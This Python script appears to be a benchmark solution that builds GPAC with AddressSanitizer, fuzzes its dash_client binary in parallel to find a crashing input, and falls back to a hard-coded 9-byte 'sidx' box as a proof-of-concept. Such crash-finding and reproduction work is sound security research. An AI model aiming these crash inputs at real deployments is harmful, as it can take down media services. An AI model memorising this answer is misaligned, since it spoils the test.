import os
import sys
import subprocess
import tarfile
import tempfile
import shutil
import glob
import random
import time
import multiprocessing

def fuzz_worker(bin_path, queue, stop_evt):
    # Seeds targeting specific lengths and box structures
    seeds = [
        # 9 byte candidates
        b"\x00\x00\x00\x09sidx\x00",
        b"\x00\x00\x00\x09ftyp\x00",
        b"\x00\x00\x00\x09moov\x00",
        b"123456789",
        b"http://a",
        b"https://a",
        # Standard small seeds
        b"A" * 8,
        b"A" * 9,
        b"A" * 10,
        b"\x00" * 9,
    ]
    
    env = os.environ.copy()
    # Ensure ASan exits with a distinct code we can catch
    env["ASAN_OPTIONS"] = "exitcode=77:halt_on_error=1"

    while not stop_evt.is_set():
        if seeds:
            data = seeds.pop(0)
        else:
            # Generate random inputs
            # Strategy: valid box header (size, type) + payload
            # Size: 4 bytes BE. Type: 4 bytes.
            if random.random() < 0.6:
                # Try sizes around 8-16 bytes
                size = random.randint(0, 20)
                # Common box types
                box_type = random.choice([b'sidx', b'moov', b'ftyp', b'styp', b'free', b'skip'])
                # Construct payload
                payload = size.to_bytes(4, 'big') + box_type + os.urandom(max(0, size-8))
                data = payload
            else:
                # String based mutation
                length = random.randint(1, 20)
                data = bytearray(random.getrandbits(8) for _ in range(length))
                data = bytes(data)

        # Write input to a temporary file
        try:
            with tempfile.NamedTemporaryFile(delete=False) as tf:
                tf.write(data)
                fname = tf.name
            
            # Execute target with file argument
            try:
                # Timeout set to 1s to process many inputs quickly
                res = subprocess.run([bin_path, fname], capture_output=True, env=env, timeout=1)
                
                # Check for crash
                if res.returncode == 77 or b"AddressSanitizer" in res.stderr:
                    queue.put(data)
                    stop_evt.set()
                    os.remove(fname)
                    return
                
                # Some CLIs treat arguments as input data (e.g. URLs)
                # Try passing data as argument if it looks like a string
                if len(data) < 100:
                    try:
                        s_data = data.decode('utf-8')
                        res = subprocess.run([bin_path, s_data], capture_output=True, env=env, timeout=1)
                        if res.returncode == 77 or b"AddressSanitizer" in res.stderr:
                            queue.put(data)
                            stop_evt.set()
                            os.remove(fname)
                            return
                    except:
                        pass
                        
            except subprocess.TimeoutExpired:
                pass
            finally:
                if os.path.exists(fname):
                    os.remove(fname)
        except Exception:
            pass

class Solution:
    def solve(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=work_dir)
            
            # Find the root directory of the source
            src_root = work_dir
            for root, dirs, files in os.walk(work_dir):
                if "configure" in files:
                    src_root = root
                    break
            
            # 2. Build the application with ASan
            # GPAC/dash_client build configuration
            env = os.environ.copy()
            env["CFLAGS"] = "-fsanitize=address -g -O1"
            env["CXXFLAGS"] = "-fsanitize=address -g -O1"
            env["LDFLAGS"] = "-fsanitize=address"
            
            # Configure
            # Disable GUI and heavy modules to speed up build and avoid dependency issues
            config_cmd = [
                "./configure",
                "--enable-sanitizer",
                "--static-bin",
                "--disable-ssl",
                "--disable-opt",
                "--disable-x11",
                "--disable-qt",
                "--disable-jack",
                "--disable-pulseaudio",
                "--disable-av1"
            ]
            
            # Run configure
            subprocess.run(
                config_cmd, 
                cwd=src_root, 
                env=env, 
                check=False, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL
            )
            
            # Run make
            subprocess.run(
                ["make", "-j8"], 
                cwd=src_root, 
                env=env, 
                check=False, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL
            )
            
            # 3. Locate the vulnerable binary
            target_bin = None
            # Prioritize bin/gcc output directory often used by GPAC
            candidates = glob.glob(os.path.join(src_root, "bin", "gcc", "dash_client"))
            if not candidates:
                candidates = glob.glob(os.path.join(src_root, "**", "dash_client"), recursive=True)
            
            # If dash_client not found, look for MP4Client (common alias/replacement)
            if not candidates:
                 candidates = glob.glob(os.path.join(src_root, "**", "MP4Client"), recursive=True)

            if candidates:
                target_bin = candidates[0]
            
            # If we couldn't build or find the binary, return a heuristic guess
            # 9 bytes Sidx box: Size(00 00 00 09) Type(sidx) Data(00)
            fallback_poc = b"\x00\x00\x00\x09sidx\x00"
            
            if not target_bin or not os.path.exists(target_bin):
                return fallback_poc

            # 4. Fuzzing Phase
            manager = multiprocessing.Manager()
            queue = manager.Queue()
            stop_evt = manager.Event()
            
            # Spawn workers
            processes = []
            num_workers = 8
            
            for _ in range(num_workers):
                p = multiprocessing.Process(target=fuzz_worker, args=(target_bin, queue, stop_evt))
                p.start()
                processes.append(p)
            
            # Monitor
            found_poc = None
            start_time = time.time()
            max_duration = 300 # 5 minutes total
            
            while time.time() - start_time < max_duration:
                if not queue.empty():
                    found_poc = queue.get()
                    break
                if stop_evt.is_set():
                    if not queue.empty():
                        found_poc = queue.get()
                    break
                time.sleep(0.5)
            
            # Cleanup
            stop_evt.set()
            for p in processes:
                p.terminate()
                p.join()
            
            return found_poc if found_poc else fallback_poc
            
        except Exception:
            return b"\x00\x00\x00\x09sidx\x00"
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)